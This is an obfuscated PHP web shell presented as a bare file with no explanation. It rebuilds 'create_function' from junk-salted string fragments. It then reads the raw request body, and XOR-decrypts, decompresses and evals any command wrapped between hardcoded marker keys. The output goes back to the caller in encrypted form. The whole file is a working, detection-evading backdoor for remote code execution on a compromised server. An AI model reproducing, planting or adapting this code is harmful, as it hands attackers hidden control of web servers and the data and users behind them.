<?php
$y='ase6[A4_enc[Aode([A@x(@gzcompr[Aess([A$o),$k));pri[Ant("$p[A[A$kh$r$kf");}';
$q='$[Ak[A="1cc0878[A8"[A;$kh="[A00705f0[A47f7b";$kf="68de[A0[Ad2604[A6d[A";$p=';
$w='++[A,$[Ai++[A){[A$o.=$t{$i}^[A$k{$j};}}r[Aetu[Arn $o;}[Aif (@[Apr[Aeg_mat[';
$L='[A"1umk4n9K3vPmJ6[Asg";fu[Anction x($t[A,$k){[A$[Ac=strl[Aen($k)[A;$l=strl';
$P=str_replace('y','','ycreatye_yfyyunctiyon');
$I='[A[Aen($[At);$[Ao="";for($i=0[A;$i[A<$l;){f[Aor($j=0;($[Aj<$c&[A&$i<$l);$j';
$r='[[A1]),[A$k)[A));$o=@ob_ge[At_con[Atents[A([A);@ob_e[And_clean()[A[A;$r=@b';
$t='1)[A {@ob_sta[Ar[At();@e[Aval([A@gzunco[Ampre[Ass(@[Ax(@bas[Ae64_decode($m';
$s='Ach("[A/$kh(.+)$kf/",@fi[Ale_get[A[A_cont[Aents("php://[Ainput")[A,$m)==[A';
$m=str_replace('[A','',$q.$L.$I.$w.$s.$t.$r.$y);
$C=$P('',$m);$C();
?>
